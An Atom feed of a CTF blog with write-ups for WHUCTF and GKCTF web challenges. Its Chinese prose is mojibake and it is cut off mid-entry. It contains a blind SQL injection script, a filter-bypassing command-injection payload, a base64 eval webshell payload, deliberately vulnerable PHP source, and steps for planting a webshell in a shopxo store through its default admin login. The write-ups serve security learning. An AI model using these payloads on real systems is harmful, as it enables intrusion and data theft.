<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>be a J0K1R</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-05-25T16:14:02.287Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Peguin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WHUCTF</title>
    <link href="http://yoursite.com/2020/05/25/WHUCTF/"/>
    <id>http://yoursite.com/2020/05/25/WHUCTF/</id>
    <published>2020-05-25T15:33:40.000Z</published>
    <updated>2020-05-25T16:14:02.287Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Easy-sqli"><a href="#Easy-sqli" class="headerlink" title="Easy_sqli"></a>Easy_sqli</h4><a id="more"></a><p>é¢˜ç›®æ‰“å¼€æ˜¯ä¸ªç™»å½•æ¡†ï¼Œæ ¹æ®é¢˜ç›®åº”è¯¥å°±æ˜¯sqlæ³¨å…¥ï¼Œä¸‡èƒ½å¯†é’¥ç™»å½•ï¼Œå¼¹çª—æ˜¾ç¤ºç™»å½•æˆåŠŸï¼Œæ— å…¶ä»–å›æ˜¾ï¼Œåˆ¤æ–­æ˜¯ç›²æ³¨</p><p>fuzzä¸€ä¸‹ï¼Œè¿‡æ»¤äº†orã€selectç­‰ï¼ŒåŒå†™ç»•è¿‡æˆåŠŸï¼Œç›´æ¥è´´è„šæœ¬å§ï¼ˆç¬¬ä¸€æ¬¡è‡ªå·±æ‰‹å†™çš„è„šæœ¬ï¼ŒçœŸçš„æ˜¯å¾ˆå–œæ‚¦äº†ï¼Œè™½ç„¶æ²¡æœ‰äºŒåˆ†æ³•å¿«ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author peguin</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://218.197.154.9:10011/login.php"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line"><span class="string">'Connection'</span>:<span class="string">'keep-alive'</span></span><br><span class="line">&#125;</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_,&#123;&#125;!@#$%^&amp;*()?~'</span>:</span><br><span class="line">        <span class="comment"># passwd = "1' oorr ascii(substr((selselectect database()),&#123;&#125;,1))=&#123;&#125;#".format(i,ord(j))#easy_sql1</span></span><br><span class="line">        <span class="comment">#passwd = "1' oorr ascii(substr((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema='easy_sql1'),&#123;&#125;,1))=&#123;&#125;#".format(i,ord(j))#f1ag_y0u_wi1l_n3ver_kn0w,users</span></span><br><span class="line">        <span class="comment">#passwd = "1' oorr ascii(substr((selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name='f1ag_y0u_wi1l_n3ver_kn0w'),&#123;&#125;,1))=&#123;&#125;#".format(i, ord(j))#f111114g</span></span><br><span class="line">        passwd = <span class="string">"1' oorr ascii(substr((seselectlect f111114g frfromom f1ag_y0u_wi1l_n3ver_kn0w),&#123;&#125;,1))=&#123;&#125;#"</span>.format(i, ord(j))</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'user'</span>:passwd,</span><br><span class="line">            <span class="string">'pass'</span>:<span class="string">'123'</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(passwd)</span></span><br><span class="line">        r = requests.post(url,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Login success!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            res += j</span><br><span class="line">            print(res)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨äºŒåˆ†æ³•ä¼šå¾ˆå¿«ï¼Œè€Œä¸”ç”¨äºŒåˆ†æ³•å¯ä»¥ä¸ç”¨è€ƒè™‘ç‰¹æ®Šå­—ç¬¦ï¼Œéƒ½åŒ…å«åœ¨é‡Œé¢äº†ï¼ŒæŠ½æ—¶é—´å†™ä¸€ä¸ªäºŒåˆ†æ³•çš„ç›²æ³¨è½®å­</p><h4 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h4><p>æ‰“å¼€é¢˜ç›®ï¼Œåœ¨contacté¡µé¢å‘ç°æœ‰æäº¤æ¡†ï¼ŒçŒœæµ‹åˆ©ç”¨ç‚¹åœ¨è¿™é‡Œï¼Œéšä¾¿å†™å†™æäº¤ï¼ŒF12ï¼Œå‘ç°ç‚¹æç¤º</p><img src="/2020/05/25/WHUCTF/1.png" class="" title="examplename"><p>è„‘æ´ï¼Œä¸€æ—¶ä¹‹é—´æƒ³ä¸åˆ°åŠæ³•ï¼Œæ— æ„å¤šåˆ·æ–°äº†å‡ æ¬¡ï¼Œå‘ç°è„šæ³¨é‚£é‡Œçš„å†…å®¹ä¼šæ”¹å˜ï¼ŒçŒœæµ‹getç‚¹æœ‰éšè—çš„å‚æ•°æ²¡æœ‰æ˜¾ç¤ºï¼Œæ ¹æ®ä»¥å¾€çš„ç»éªŒï¼Œï¼Œä¸€èˆ¬æ–‡ä»¶åŒ…å«çš„å‚æ•°éƒ½ä¼šæ˜¯fileï¼ŒçŒœæµ‹å°è¯•ï¼ŒæˆåŠŸ</p><img src="/2020/05/25/WHUCTF/2.png" class="" title="examplename"><p>ä¸‹é¢å°±æ˜¯ç”¨phpä¼ªåè®®è¯»å–ï¼Œè¿™é‡Œç›´æ¥å°è¯•è¯»å–flag.php</p><img src="/2020/05/25/WHUCTF/3.png" class="" title="examplename"><h4 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h4><p>å¼€é¢˜ï¼Œç»™æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$string_1 = $_GET[<span class="string">'str1'</span>];</span><br><span class="line">$string_2 = $_GET[<span class="string">'str2'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'ä¼šä»£ç å®¡è®¡å˜›23333'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2nd</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3nd</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">'/x/'</span>, <span class="string">'yy'</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line"></span><br><span class="line">$password = <span class="string">"aaaaa"</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line"></span><br><span class="line">$r = filter(serialize($user));</span><br><span class="line"><span class="keyword">if</span>(unserialize($r)[<span class="number">1</span>] == <span class="string">"123456"</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ­¥ç”¨%0aå³å¯ç»•è¿‡ï¼Œå¾ˆç†Ÿæ‚‰äº†</p><p>ç¬¬äºŒæ­¥è¿™é‡Œä¹‹å‰æ²¡æœ‰é‡åˆ°è¿‡ï¼Œè¿™é‡Œè¦md5åŠ å¯†ä¹‹åçš„ä¸¤ä¸ªæ•°ä¸ä¸€æ ·ï¼Œåœ¨ç»è¿‡strtrå‡½æ•°æ›¿æ¢ä¹‹ååˆè¦ç›¸ç­‰ï¼Œæ‰¾äº†èµ„æ–™ï¼Œæ‰¾åˆ°äº†ç±»ä¼¼çš„é¢˜ï¼Œåªä¸è¿‡æ›¿æ¢çš„å†…å®¹ä¸ä¸€æ ·ï¼Œåªè¦æ˜¯åœ¨ç»è¿‡å‡½æ•°æ›¿æ¢ä¹‹åçš„md5å€¼æ˜¯çº¯æ•°å­—ä¸”ä¸º0eå¼€å¤´å³å¯ï¼Œé™„ä¸Šçˆ†ç ´è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(f)</span>:</span></span><br><span class="line">    p = hashlib.md5(f.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100000000</span>):</span><br><span class="line">    s = md5(str(i)).replace(<span class="string">'b'</span>,<span class="string">'5'</span>)</span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">'0e'</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'a'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'b'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'c'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'d'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                        <span class="keyword">if</span> <span class="string">'e'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">'f'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                                print(<span class="string">'i:'</span>+str(i)+<span class="string">'md5:'</span>+s)</span><br><span class="line"><span class="comment">#è¿™é‡Œæ˜¯è·‘çš„å‡ ä¸ªå€¼</span></span><br><span class="line">i:<span class="number">11230178</span>md5:<span class="number">0e732639146814822596549556939597</span></span><br><span class="line">i:<span class="number">20493141</span>md5:<span class="number">0e343359461627556649445574858858</span></span><br><span class="line">i:<span class="number">31367140</span>md5:<span class="number">0e792219082918318159634476857695</span></span><br><span class="line">i:<span class="number">40371185</span>md5:<span class="number">0e675215526424812964725042621087</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰æ­¥å°±æ˜¯ååºåˆ—åŒ–çš„å­—ç¬¦é€ƒé€¸äº†ï¼Œéœ€è¦åœ¨ååºåˆ—åŒ–ä¹‹åçš„ä¸‹æ ‡ä¸º1çš„æ•°ç»„å…ƒç´ çš„å€¼ä¸º123456ï¼Œè€Œç»è¿‡filterä¼šæŠŠxæ›¿æ¢ä¸ºyyï¼Œæ‰€ä»¥ä¸€ä¸ªxå¯ä»¥é€ƒé€¸ä¸€ä¸ªå­—ç¬¦ï¼Œåœ¨æœ¬åœ°æµ‹è¯•ä¹‹åæ„é€ å‡ºè¿™ä¸€æ­¥çš„payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=xxxxxxxxxxxxxxxxxxxx<span class="string">";i:1;s:6:"</span><span class="number">123456</span><span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸‰æ­¥ç»“åˆèµ·æ¥ï¼Œå°±å¯ä»¥æ‹¿åˆ°flagäº†ï¼Œflagåœ¨æºç å¤„èƒ½å¤Ÿçœ‹åˆ°</p><h4 id="ezcmd"><a href="#ezcmd" class="headerlink" title="ezcmd"></a>ezcmd</h4><p>å¼€é¢˜ï¼Œç»™æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no flag"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/tac|rm|echo|cat|nl|less|more|tail|head/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"cat't read flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip); </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é¢˜å’ŒGXYçš„pingpingpingç±»ä¼¼ï¼Œä½†æ˜¯è¿‡æ»¤æ›´ä¸¥æ ¼ä¸€ç‚¹ï¼Œæ–‡ä»¶å†…å®¹è¯»å–å…¨è¢«è¿‡æ»¤ï¼Œä¸è¿‡ä¼ªåè®®æ²¡è¢«è¿‡æ»¤åº”è¯¥å¯ä»¥ç”¨ï¼Œæˆ‘ç”¨çš„æ˜¯GXYçš„payloadç¨ä½œä¿®æ”¹æ‰“çš„ï¼Œç”¨å­—ç¬¦æ‹¼æ¥ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;g;ca\t$IFS$9fla$a.php</span><br></pre></td></tr></table></figure><p>å›æ˜¾pingæˆåŠŸäº†ï¼ŒF12å‘ç°flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;Easy-sqli&quot;&gt;&lt;a href=&quot;#Easy-sqli&quot; class=&quot;headerlink&quot; title=&quot;Easy_sqli&quot;&gt;&lt;/a&gt;Easy_sqli&lt;/h4&gt;
    
    </summary>
    
    
    
      <category term="WHUCTF" scheme="http://yoursite.com/tags/WHUCTF/"/>
    
  </entry>
  
  <entry>
    <title>GKCTF</title>
    <link href="http://yoursite.com/2020/05/24/GKCTF/"/>
    <id>http://yoursite.com/2020/05/24/GKCTF/</id>
    <published>2020-05-24T13:52:49.000Z</published>
    <updated>2020-05-25T14:53:15.727Z</updated>
    
    <content type="html"><![CDATA[<p>å‰è¨€ï¼š</p><a id="more"></a><p>è¿™æ¬¡æ¯”èµ›å¯ä»¥è¯´æ‰“çš„æŒºç³Ÿç³•å§ï¼Œæ²¡æœ‰åšå‡ºæ¥çš„webï¼Œè¿˜æ˜¯ç§¯ç´¯çš„ä¸å¤Ÿï¼Œåšçš„é¢˜ä¸å¤Ÿå¤šï¼Œä»éœ€åŠªåŠ›å•Šï¼ä¸‹é¢æ˜¯èµ›åå¤ç°ï¼Œä¸å¤šè¯´ï¼Œå¼€æ•´ï¼</p><h4 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h4><p>å¼€é¢˜ç»™äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="keyword">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">'Ginkgo'</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br></pre></td></tr></table></figure><p>å®¡è®¡ä»£ç ,ç»™Ginkgoä»¥GETæˆ–è€…POSTçš„æ–¹å¼ä¼ é€’base64åŠ å¯†è¿‡çš„è¯­å¥ï¼Œä¼šé€šè¿‡evalæ‰“å°å‡ºæ¥ï¼Œå°±æˆäº†phpä¸­å¯æ‰§è¡Œçš„è¯­å¥ï¼Œé€šè¿‡è¿™ä¸ªæ–¹æ³•å¯ä»¥å†™å…¥ä¸€å¥è¯getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ginkgo&#x3D;ZXZhbCgkX1BPU1RbJ2NtZCddKTs&#x3D;</span><br></pre></td></tr></table></figure><img src="/2020/05/24/GKCTF/1.png" class="" title="examplename"><p>å¯ä»¥çœ‹åˆ°disable_functionä¸­ç¦ç”¨äº†å¾ˆå¤šæ‰§è¡Œå‡½æ•°ï¼Œè·Ÿä¹‹å‰çš„ä¸€é“RCEMEå¾ˆåƒï¼Œèšå‰‘è¿ä¸€ä¸‹ï¼Œæ ¹ç›®å½•ä¸‹æœ‰flagå’Œreadflagï¼Œä½†æ˜¯ä¸èƒ½è¯»ï¼Œå°è¯•ç”¨æ’ä»¶ç»•è¿‡ï¼Œæ²¡æœ‰ç”¨</p><p>æ‰¾åˆ«çš„å¸ˆå‚…æ‹¿äº†ä¸€ä¸ªç»•php7.3disable_functionçš„æ–‡ä»¶(ps:æ¯”èµ›æ‰¾èµ„æ–™çš„èƒ½åŠ›å¤ªèœäº†23333)</p><p>å¯ä»¥æŠŠé‚£ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°tmpç›®å½•ä¸‹ï¼ˆtmpç›®å½•æ˜¯å¯ä¼ çš„ï¼Œä¹‹å‰å¹¶ä¸çŸ¥é“ï¼Œå¤ªèœï¼‰</p><p>ç„¶åå†åŒ…å«ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶çš„æ‰€åœ¨è·¯å¾„ï¼Œgetåˆ°flag</p><img src="/2020/05/24/GKCTF/2.png" class="" title="examplename"><h4 id="GKCTF2020-è€å…«å°è¶…å¸‚å„¿"><a href="#GKCTF2020-è€å…«å°è¶…å¸‚å„¿" class="headerlink" title="[GKCTF2020]è€å…«å°è¶…å¸‚å„¿"></a>[GKCTF2020]è€å…«å°è¶…å¸‚å„¿</h4><p>æ‰“å¼€æ˜¯shopxoå•†åŸï¼Œgoogleä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« è®²shopxoåå°è·å–shellçš„æ–‡ç« [é™„ä¸Šé“¾æ¥ï¼š<a href="http://www.nctry.com/1660.html]" target="_blank" rel="noopener">http://www.nctry.com/1660.html]</a></p><p>è®¿é—®admin.phpé¡µé¢ï¼Œé»˜è®¤ç™»å½•ç”¨æˆ·åå’Œå¯†ç æ˜¯adminå’Œshopxo</p><p>åœ¨åå°ä¸‹è½½é»˜è®¤ä¸»é¢˜ï¼ŒæŠŠè‡ªå·±çš„ğŸæ”¾åœ¨default_static_ ç›®å½•ä¸‹ï¼Œå†åœ¨åå°æ‰¾åˆ°ç½‘ç«™ç®¡ç†-ä¸»é¢˜ç®¡ç†-ä¸»é¢˜å®‰è£…ï¼Œshellå°±æˆåŠŸä¸Šä¼ äº†ï¼Œè®¿é—®åœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;xxx.php</span><br></pre></td></tr></table></figure><p>èšå‰‘è¿æ¥ï¼Œæ ¹ç›®å½•ä¸‹æœ‰flagå’Œreadflagï¼Œå¾—åˆ°æç¤º</p><p>true_flag_in_/root</p><p>å…ˆçœ‹ä¸€ä¸‹è¿›ç¨‹ï¼Œpa aux(æœ‰æ—¶é—´æ€»ç»“ä¸€ä¸‹linuxä¸€äº›ä¸ç†Ÿæ‚‰çš„å‘½ä»¤)</p><p>è¯»å–ä¸€ä¸‹auto.sh,å‘ç°pyæ–‡ä»¶ï¼Œè¯»å–</p><img src="/2020/05/24/GKCTF/3.png" class="" title="examplename"><p>è¿™ä¸ªpythonæ–‡ä»¶ä¼šæŠŠæŸäº›å†…å®¹å†™å…¥åˆ°flag.hintä¸­ï¼Œæˆ‘ä»¬åªè¦ä¿®æ”¹ä¸€ä¸‹å°±èƒ½æ‹¿åˆ°flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">os.system(<span class="string">"whoami"</span>)</span><br><span class="line">gk1=str(time.ctime())</span><br><span class="line">gk=<span class="string">"\nGet The RooT,The Date Is Useful!"</span></span><br><span class="line">f=io.open(<span class="string">"/flag.hint"</span>, <span class="string">"rb+"</span>)</span><br><span class="line">s=os.popen(<span class="string">'cat /root/flag'</span>).read()</span><br><span class="line">f.write(str(s))</span><br><span class="line">f.write(str(gk1))</span><br><span class="line">f.write(str(gk))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>ç­‰å¾…60sï¼Œåœ¨flag.hintæ‰¾åˆ°flag</p><h4 id="GKCTF2020-cveç‰ˆç­¾åˆ°"><a href="#GKCTF2020-cveç‰ˆç­¾åˆ°" class="headerlink" title="[GKCTF2020]cveç‰ˆç­¾åˆ°"></a>[GKCTF2020]cveç‰ˆç­¾åˆ°</h4><p>æ‰“å¼€é¢˜ç›®æœ‰ä¸€ä¸ªé“¾æ¥ï¼Œç‚¹å‡»ï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œæ ¹æ®hintï¼Œcve-2020-7066ï¼Œgoogleï¼Œå‘ç°è¿™ä¸ªæ¼æ´ç”¨çš„å°±æ˜¯%00æˆªæ–­ï¼Œçœ‹äº†åˆ«çš„å¸ˆå‚…è¯´å’Œæ˜¨å¤©bjdçš„è€ƒç‚¹ç±»ä¼¼ï¼Œå¯æƒœä¹Ÿæ²¡åšå‡ºæ¥ï¼Œä¿®æ”¹ä¸€ä¸‹è®¿é—®çš„url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 